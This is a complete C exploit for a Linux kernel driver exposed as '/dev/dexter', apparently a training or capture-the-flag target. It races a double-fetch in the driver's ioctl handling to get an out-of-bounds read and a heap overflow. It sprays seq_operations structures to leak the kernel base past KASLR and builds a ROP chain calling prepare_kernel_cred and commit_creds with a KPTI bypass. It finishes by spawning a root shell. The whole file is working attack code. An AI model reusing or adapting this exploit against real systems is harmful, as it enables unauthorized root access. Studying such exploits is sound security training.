#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

unsigned long kbase;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_seq_start 0x170f80
#define rop_mov_esp_39000000h (kbase + 0x52027a)
#define rop_pop_rdi (kbase + 0x09b0cd)
#define rop_pop_rcx (kbase + 0x10d88b)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x63d0ab)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x072810)
#define addr_prepare_kernel_cred (kbase + 0x0729b0)

typedef struct {
  char *ptr;
  size_t len;
} request_t;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd;
request_t req;

int set(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}
int get(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int race_win = 0;

// Race to modify req.len after the module's verify_request has returned
// successfully, so that driver's copy_data_to_user reads a different length
// on the second fetch, resulting in an out-of-bounds read.
void *race(void* arg) {
  while (!race_win) {
    req.len = (size_t)arg;
    usleep(1);
  }
}

void overread(char *buf, size_t len) {
  char *zero = (char*)malloc(len);
  pthread_t th;
  pthread_create(&th, NULL, race, (void*)len);

  memset(buf, 0, len);
  memset(zero, 0, len);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, len) != 0) {
      race_win = 1;
      break;
    }
  }

  pthread_join(th, NULL);
  race_win = 0;
  free(zero);
}

void overwrite(char *buf, size_t len) {
  pthread_t th;
  char *tmp = (char*)malloc(len);

  while (1) {
    // Race a constant number of times
    pthread_create(&th, NULL, race, (void*)len);
    for (int i = 0; i < 0x10000; i++) set(buf, 0x20);
    race_win = 1;
    pthread_join(th, NULL);
    race_win = 0;
    // Retry if heap overflow did not succeed
    overread(tmp, len);
    if (memcmp(tmp, buf, len) == 0) break;
  }

  free(tmp);
}

int main() {
  save_state();

  // spray `seq_operations` around the Dexter buffer
  int spray[0x100];
  for (int i = 0; i < 0x80; i++)
    spray[i] = open("/proc/self/stat", O_RDONLY);
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");
  for (int i = 0x80; i < 0x100; i++)
    spray[i] = open("/proc/self/stat", O_RDONLY);

  // KASLR回避
  char buf[0x40];
  overread(buf, 0x40);
  kbase = *(unsigned long*)&buf[0x20] - ofs_seq_start;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // ROP chainの用意
  void *p = mmap((void*)(0x39000000 - 0x8000), 0x10000, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                 -1, 0);
  if (p == MAP_FAILED) fatal("mmap");

  unsigned long *chain = (unsigned long*)0x39000000;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // RIP制御
  *(unsigned long*)&buf[0x20] = rop_mov_esp_39000000h;
  overwrite(buf, 0x28);

  // Trigger the exploit
  for (int i = 0; i < 0x100; i++) {
    read(spray[i], buf, 1);
  }

  return 0;
}
